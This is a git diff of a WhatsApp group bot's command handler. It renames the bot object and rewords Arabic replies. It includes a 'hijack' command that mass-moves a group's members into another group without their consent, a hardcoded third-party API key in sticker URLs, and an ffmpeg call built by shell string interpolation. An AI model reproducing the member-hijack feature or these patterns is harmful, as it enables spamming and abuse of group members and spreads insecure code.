-		ElgazarBot.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
+		Elza3emgonBot.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
 	    }
 	    break
 case 'stickman':
 m.reply(mess.wait)
-ElgazarBot.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/manusia-lidi?apikey=dhmDlD5x`}}, {quoted: m })
+Elza3emgonBot.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/manusia-lidi?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'spongebob':
 m.reply(mess.wait)
-ElgazarBot.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kawan-sponsbob?apikey=dhmDlD5x`}}, {quoted: m })
+Elza3emgonBot.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kawan-sponsbob?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'gojosatoru':
 m.reply(mess.wait)
-ElgazarBot.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/gojosatoru?apikey=dhmDlD5x`}}, {quoted: m })
+Elza3emgonBot.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/gojosatoru?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'nicholas':
 m.reply(mess.wait)
-ElgazarBot.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/nicholas?apikey=dhmDlD5x`}}, {quoted: m })
+Elza3emgonBot.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/nicholas?apikey=dhmDlD5x`}}, {quoted: m })
 break
 case 'cartoon':
 m.reply(mess.wait)
-ElgazarBot.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kr-robot?apikey=dhmDlD5x`}}, {quoted: m })
+Elza3emgonBot.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kr-robot?apikey=dhmDlD5x`}}, {quoted: m })
 break
 		case 'دبه': case 'ضوضاء': case 'deep': case 'earrape': case 'سريع': case 'بطئ2': case 'طفل': case 'عكس': case 'روبوت': case 'slow': case 'smooth': case 'squirrel':
                 try {
@@ -3420,13 +3421,13 @@ break
                 if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                 if (/audio/.test(mime)) {
                 m.reply(mess.wait)
-                let media = await ElgazarBot.downloadAndSaveMediaMessage(quoted)
+                let media = await Elza3emgonBot.downloadAndSaveMediaMessage(quoted)
                 let ran = getRandom('.mp3')
                 exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                 fs.unlinkSync(media)
                 if (err) return m.reply(err)
                 let buff = fs.readFileSync(ran)
-                ElgazarBot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
+                Elza3emgonBot.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                 fs.unlinkSync(ran)
                 })
                 } else m.reply(`رد علي مقطع صوتي واكتب *${prefix + command}*`)
@@ -3464,7 +3465,7 @@ break
 Info: *bold* hash is Locked
 ${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
 `.trim()
-                ElgazarBot.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
+                Elza3emgonBot.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
             }
             break
             case 'lockcmd': {
@@ -3494,7 +3495,7 @@ View list of Messages With ${prefix}listmsg`)
                 if (!text) throw `Example : ${prefix + command} file name\n\nView message list with ${prefix}listmsg`
                 let msgs = global.db.data.database
                 if (!(text.toLowerCase() in msgs)) throw `'${text}' not listed in the message list`
-                ElgazarBot.copyNForward(m.chat, msgs[text.toLowerCase()], true)
+                Elza3emgonBot.copyNForward(m.chat, msgs[text.toLowerCase()], true)
             }
             break
             case 'listmsg': {
@@ -3519,7 +3520,7 @@ reply(`•CHEEMS BOT DEVELOPER•\n\n\n   ©2021-2022 Xeon Bot Inc.\n\n🦄Dream
 }
             break
 case 'owner': case 'المطور': case 'توماس': case 'mod': {
-ElgazarBot.sendContact(m.chat, owner, m)
+Elza3emgonBot.sendContact(m.chat, owner, m)
 }
             break
         case 'menfess':
@@ -3535,11 +3536,11 @@ ElgazarBot.sendContact(m.chat, owner, m)
 				 let teksnya = `Hi friend, there is confess message for you!!\n\nFrom :  _${saking}_  \nMessage : _${pesan}_ `
 					gambar = `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`
 				 var button = [{ buttonId: `menfesconfirm`, buttonText: { displayText: `CONFIRM‡` }, type: 1 }, { buttonId: `menu`, buttonText: { displayText: `Menu` }, type: 1 }]
-					ElgazarBot.sendMessage(`${nomor}@s.whatsapp.net`, { caption: teksnya, image: {url: `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`}, buttons: button, footer: botname })
+					Elza3emgonBot.sendMessage(`${nomor}@s.whatsapp.net`, { caption: teksnya, image: {url: `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`}, buttons: button, footer: botname })
 				m.reply(`Success Sending Menfess!!`)
 				break
 			case 'menfesconfirm':{
- 				 ElgazarBot.sendMessage(q, {text: `It's been confirmed, Confess🌹`})
+ 				 Elza3emgonBot.sendMessage(q, {text: `It's been confirmed, Confess🌹`})
 				  m.reply(`Thank you confess for being accepted.`)
 				}
 				break
@@ -3549,7 +3550,7 @@ case 'anonymous': {
 				let buttons = [
                     { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                 ]
-                ElgazarBot.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await ElgazarBot.getName(m.sender)} Welcome To Anonymous Chat\n\nClick the button below to find a partner\`\`\``, botname, m)
+                Elza3emgonBot.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await Elza3emgonBot.getName(m.sender)} Welcome To Anonymous Chat\n\nClick the button below to find a partner\`\`\``, botname, m)
             }
 			break
 case 'keluar': case 'leave': {
@@ -3560,12 +3561,12 @@ case 'keluar': case 'leave': {
                     let buttons = [
                         { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                     ]
-                    await ElgazarBot.sendButtonText(m.chat, buttons, `\`\`\`You Are Not In Anonymous Session, Press Button To Find Partner \`\`\``)
+                    await Elza3emgonBot.sendButtonText(m.chat, buttons, `\`\`\`You Are Not In Anonymous Session, Press Button To Find Partner \`\`\``)
                     throw false
                 }
                 m.reply('Ok')
                 let other = room.other(m.sender)
-                if (other) await ElgazarBot.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
+                if (other) await Elza3emgonBot.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
                 delete this.anonymous[room.id]
                 if (command === 'leave') break
             }
@@ -3576,7 +3577,7 @@ case 'keluar': case 'leave': {
                     let buttons = [
                         { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                     ]
-                    await ElgazarBot.sendButtonText(m.chat, buttons, `\`\`\`You are still in an anonymous session, press the button below to terminate your anonymous session\`\`\``, botname, m)
+                    await Elza3emgonBot.sendButtonText(m.chat, buttons, `\`\`\`You are still in an anonymous session, press the button below to terminate your anonymous session\`\`\``, botname, m)
                     throw false
                 }
                 let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
@@ -3585,10 +3586,10 @@ case 'keluar': case 'leave': {
                         { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                         { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                     ]
-                    await ElgazarBot.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send messages\`\`\``, botname, m)
+                    await Elza3emgonBot.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send messages\`\`\``, botname, m)
                     room.b = m.sender
                     room.state = 'CHATTING'
-                    await ElgazarBot.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send messages\`\`\``, botname, m)
+                    await Elza3emgonBot.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send messages\`\`\``, botname, m)
                 } else {
                     let id = + new Date
                     this.anonymous[id] = {
@@ -3606,7 +3607,7 @@ case 'keluar': case 'leave': {
                     let buttons = [
                         { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                     ]
-                    await ElgazarBot.sendButtonText(m.chat, buttons, `\`\`\`Please wait, looking for a partner\`\`\``, botname, m)
+                    await Elza3emgonBot.sendButtonText(m.chat, buttons, `\`\`\`Please wait, looking for a partner\`\`\``, botname, m)
                 }
                 break
             }
@@ -3618,11 +3619,11 @@ case 'keluar': case 'leave': {
                     let buttons = [
                         { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                     ]
-                    await ElgazarBot.sendButtonText(m.chat, buttons, `\`\`\`You are not in an anonymous session, press the button to find a partner\`\`\``)
+                    await Elza3emgonBot.sendButtonText(m.chat, buttons, `\`\`\`You are not in an anonymous session, press the button to find a partner\`\`\``)
                     throw false
                 }
                 let other = romeo.other(m.sender)
-                if (other) await ElgazarBot.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
+                if (other) await Elza3emgonBot.sendText(other, `\`\`\`Partner Has Left Anonymous Session\`\`\``, m)
                 delete this.anonymous[romeo.id]
                 let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                 if (room) {
@@ -3630,10 +3631,10 @@ case 'keluar': case 'leave': {
                         { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                         { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                     ]
-                    await ElgazarBot.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``, botname, m)
+                    await Elza3emgonBot.sendButtonText(room.a, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``, botname, m)
                     room.b = m.sender
                     room.state = 'CHATTING'
-                    await ElgazarBot.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``, botname, m)
+                    await Elza3emgonBot.sendButtonText(room.b, buttons, `\`\`\`Successfully Found Partner, now you can send message\`\`\``, botname, m)
                 } else {
                     let id = + new Date
                     this.anonymous[id] = {
@@ -3651,20 +3652,20 @@ case 'keluar': case 'leave': {
                     let buttons = [
                         { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                     ]
-                    await ElgazarBot.sendButtonText(m.chat, buttons, `\`\`\`Please wait, looking for a partner\`\`\``, botname, m)
+                    await Elza3emgonBot.sendButtonText(m.chat, buttons, `\`\`\`Please wait, looking for a partner\`\`\``, botname, m)
                 }
                 break
             }
             case 'عام': {
                 if (!isCreator) throw mess.owner
-                ElgazarBot.public = true
-                m.reply('*حاله البوت عام*')
+                Elza3emgonBot.public = true
+                m.reply('*حاله البوت عام يازعيم*')
             }
             break
             case 'خاص': {
                 if (!isCreator) throw mess.owner
-                ElgazarBot.public = false
-                m.reply('*حاله البوت خاص*')
+                Elza3emgonBot.public = false
+                m.reply('*حاله البوت خاص يازعيم*')
             }
             break
             case 'ping': case 'السرعه': case 'statusbot': case 'p': {
@@ -3753,7 +3754,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 ]
                 },
                 ]
-                ElgazarBot.sendListMsg(m.chat, `pilih aja *Din* Setmenu nya!`, ElgazarBot.user.name, `*Hello ElgazarBot* !`, `Pilih Din`, sections, m)
+                Elza3emgonBot.sendListMsg(m.chat, `pilih aja *Din* Setmenu nya!`, Elza3emgonBot.user.name, `*Hello Elza3emgonBot* !`, `Pilih Din`, sections, m)
                 }
             }
             break
@@ -3765,9 +3766,9 @@ case 'req': case 'request': {
                let pjtxt = `Message From : @${me.split('@')[0]} \nFor : @${ownernya.split('@')[0]}\n\n${command} ${text}`
                let ments = [ownernya, me]
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '🙏THANKS' }, type: 1 }]
-            await ElgazarBot.sendButtonText(ownernya, buttons, pjtxt, botname, m, {mentions: ments, quoted: fdoc})
+            await Elza3emgonBot.sendButtonText(ownernya, buttons, pjtxt, botname, m, {mentions: ments, quoted: fdoc})
             let akhji = `*Request has been sent*\n*To Owner @${ownernya.split('@')[0]}*\n_Thank you🙏_`
-            await ElgazarBot.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments, quoted: fkontak})
+            await Elza3emgonBot.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments, quoted: fkontak})
             }
             break
 case 'report': case 'bug': {
@@ -3777,9 +3778,9 @@ case 'report': case 'bug': {
                let pjtxt = `Message From : @${me.split('@')[0]} \nFor : @${ownernya.split('@')[0]}\n\n${text}`
                let ments = [ownernya, me]
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '🙏THANKS FOR THE REPORT' }, type: 1 }]
-            await ElgazarBot.sendButtonText(ownernya, buttons, pjtxt, botname, m, {mentions: ments})
+            await Elza3emgonBot.sendButtonText(ownernya, buttons, pjtxt, botname, m, {mentions: ments})
             let akhji = `Report Sent\nTo Owner @${ownernya.split('@')[0]}\n*Thank you for the report🙏*\n_Your number will be blocked_\n_If the Report is Only Created_`
-            await ElgazarBot.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments})
+            await Elza3emgonBot.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments})
             }
             break
             case 'sound1':
@@ -3943,8 +3944,8 @@ case 'sound158':
 case 'sound159':
 case 'sound160':
 case 'sound161':
-ElgazarBot_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
-await ElgazarBot.sendMessage(m.chat, { audio: ElgazarBot_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
+Elza3emgonBot_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
+await Elza3emgonBot.sendMessage(m.chat, { audio: Elza3emgonBot_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
 break
 case 'hijack':{
   if(!isCreator) throw mess.owner
@@ -3952,15 +3953,15 @@ case 'hijack':{
   let text2 = q.split("|")[1]
   if(!text1) throw `Example:\n${order +' 1234567890@g.us|_amount_'}`
   if(!text2) throw `Eg:\n${order +' 1234567890@g.us|_amount_'}`
-  ElgazarBot.sendMessage(text1, { text: `Member kidnapping request by @${m.sender.split("@")[0]}\nAmount: ${text2}\nImporting from : ${from} => ${text1}`, mentions: [m.sender] },{ quoted : m })               
-  await ElgazarBot.sendMessage(from, { text: `Member kidnapping request by @${m.sender.split("@")[0]}\nAmount: ${text2}\nImporting from : ${from} => ${text1}`, mentions: [m.sender] },{ quoted : m })                
+  Elza3emgonBot.sendMessage(text1, { text: `Member kidnapping request by @${m.sender.split("@")[0]}\nAmount: ${text2}\nImporting from : ${from} => ${text1}`, mentions: [m.sender] },{ quoted : m })               
+  await Elza3emgonBot.sendMessage(from, { text: `Member kidnapping request by @${m.sender.split("@")[0]}\nAmount: ${text2}\nImporting from : ${from} => ${text1}`, mentions: [m.sender] },{ quoted : m })                
   await m.sequestrar(text1, participants.map(mem => mem.id), text2)
   }
   break
 case 'setthumb':{
                        if (!m.key.fromMe && !isCreator) return m.reply(mess.owner)
                        if (!isQuotedImage) return m.reply('Reply the picture!')
-                                 let media = await ElgazarBot.downloadMediaMessage(m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
+                                 let media = await Elza3emgonBot.downloadMediaMessage(m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
                 await fs.writeFileSync('./XeonMedia/theme/cheemspic.jpg', media)
                m.reply(mess.success)
             }
@@ -3968,9 +3969,9 @@ case 'setthumb':{
 case 'creategroup':
 if (!isCreator) return m.reply(mess.owner)
 if (!q) return reply("Enter text")
-const group = await ElgazarBot.groupCreate(q, [owner + "@s.whatsapp.net"])
+const group = await Elza3emgonBot.groupCreate(q, [owner + "@s.whatsapp.net"])
 m.reply(mess.success)
-ElgazarBot.sendMessage(group.id, { text: 'Halo!!' }) // say hello to everyone on the group
+Elza3emgonBot.sendMessage(group.id, { text: 'Halo!!' }) // say hello to everyone on the group
 break
 case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
 if (!m.isGroup) return m.reply(mess.group)
@@ -3981,13 +3982,13 @@ if (AntiLinkYoutubeVid) return m.reply('Already activated')
 ntilinkytvid.push(from)
 fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
 m.reply('Success in turning on youtube video antilink in this group')
-var groupe = await ElgazarBot.groupMetadata(from)
+var groupe = await Elza3emgonBot.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+Elza3emgonBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkYoutubeVid) return m.reply('Already deactivated')
 let off = ntilinkytvid.indexOf(from)
@@ -3999,7 +4000,7 @@ m.reply('Success in turning off youtube video antilink in this group')
   { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
-  await ElgazarBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  await Elza3emgonBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
   }
   }
   break
@@ -4012,13 +4013,13 @@ if (AntiLinkYoutubeChannel) return m.reply('Already activated')
 ntilinkytch.push(from)
 fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
 m.reply('Success in turning on youtube channel antilink in this group')
-var groupe = await ElgazarBot.groupMetadata(from)
+var groupe = await Elza3emgonBot.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+Elza3emgonBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkYoutubeChannel) return m.reply('Already deactivated')
 let off = ntilinkytch.indexOf(from)
@@ -4030,7 +4031,7 @@ m.reply('Success in turning off youtube channel antilink in this group')
   { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
-  await ElgazarBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  await Elza3emgonBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
   }
   }
   break
@@ -4043,13 +4044,13 @@ if (AntiLinkInstagram) return m.reply('Already activated')
 ntilinkig.push(from)
 fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
 m.reply('Success in turning on instagram antilink in this group')
-var groupe = await ElgazarBot.groupMetadata(from)
+var groupe = await Elza3emgonBot.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+Elza3emgonBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkInstagram) return m.reply('Already deactivated')
 let off = ntilinkig.indexOf(from)
@@ -4061,7 +4062,7 @@ m.reply('Success in turning off instagram antilink in this group')
   { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
-  await ElgazarBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  await Elza3emgonBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
   }
   }
   break
@@ -4074,13 +4075,13 @@ if (AntiLinkFacebook) return m.reply('Already activated')
 ntilinkfb.push(from)
 fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
 m.reply('Success in turning on facebook antilink in this group')
-var groupe = await ElgazarBot.groupMetadata(from)
+var groupe = await Elza3emgonBot.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+Elza3emgonBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkFacebook) return m.reply('Already deactivated')
 let off = ntilinkfb.indexOf(from)
@@ -4092,7 +4093,7 @@ m.reply('Success in turning off facebook antilink in this group')
   { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
-  await ElgazarBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  await Elza3emgonBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
   }
   }
   break
@@ -4105,13 +4106,13 @@ if (AntiLinkTelegram) return m.reply('Already activated')
 ntilinktg.push(from)
 fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
 m.reply('Success in turning on telegram antilink in this group')
-var groupe = await ElgazarBot.groupMetadata(from)
+var groupe = await Elza3emgonBot.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+Elza3emgonBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkTelegram) return m.reply('Already deactivated')
 let off = ntilinktg.indexOf(from)
@@ -4123,7 +4124,7 @@ m.reply('Success in turning off telegram antilink in this group')
   { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
-  await ElgazarBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  await Elza3emgonBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
   }
   }
   break
@@ -4136,13 +4137,13 @@ if (AntiLinkTiktok) return m.reply('Already activated')
 ntilinktt.push(from)
 fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
 m.reply('Success in turning on tiktok antilink in this group')
-var groupe = await ElgazarBot.groupMetadata(from)
+var groupe = await Elza3emgonBot.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+Elza3emgonBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkTiktok) return m.reply('Already deactivated')
 let off = ntilinktt.indexOf(from)
@@ -4154,7 +4155,7 @@ m.reply('Success in turning off tiktok antilink in this group')
   { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
-  await ElgazarBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  await Elza3emgonBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
   }
   }
   break
@@ -4167,13 +4168,13 @@ if (AntiLinkTwitter) return m.reply('Already activated')
 ntilinktwt.push(from)
 fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
 m.reply('Success in turning on twitter antilink in this group')
-var groupe = await ElgazarBot.groupMetadata(from)
+var groupe = await Elza3emgonBot.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+Elza3emgonBot.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkTwitter) return m.reply('Already deactivated')
 let off = ntilinktwt.indexOf(from)
@@ -4185,7 +4186,7 @@ m.reply('Success in turning off twitter antilink in this group')
   { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
   { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
   ]
-  await ElgazarBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
+  await Elza3emgonBot.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
   }
   }
   break
@@ -4198,13 +4199,13 @@ if (AntiLinkTwitter) return m.reply('نشط بالفعل')
 ntilinkall.push(from)
 fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
 m.reply('النجاح في تشغيل مضاد الروابط في هذا  الجروب')
-var groupe = await ElgazarBot.groupMetadata(from)
+var groupe = await Elza3emgonBot.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-ElgazarBot.sendMessage(from, {text: `\`\`\`「 ⚠️تحذير⚠️ 」\`\`\`\n\nتحذير للاعضاء الي مش مشرفين اي حد منكم هيبعت رابط سيتم طرده`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+Elza3emgonBot.sendMessage(from, {text: `\`\`\`「 ⚠️تحذير⚠️ 」\`\`\`\n\nتحذير للاعضاء الغير مشرفين اذا لم تكن مشرف وارسلت اي روابط سوف يتم طردك من الجروب`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
 if (!AntiLinkAll) return m.reply('معطل بالفعل')
 let off = ntilinkall.indexOf(from)
@@ -4216,7 +4217,7 @@ m.reply('تم ايقاف تفعيل منع الروابط')
   { buttonId: `${command} on`, buttonText: { displayText: 'فتح' }, type: 1 },
   { buttonId: `${command} off`, buttonText: { displayText: 'قفل' }, type: 1 }
   ]
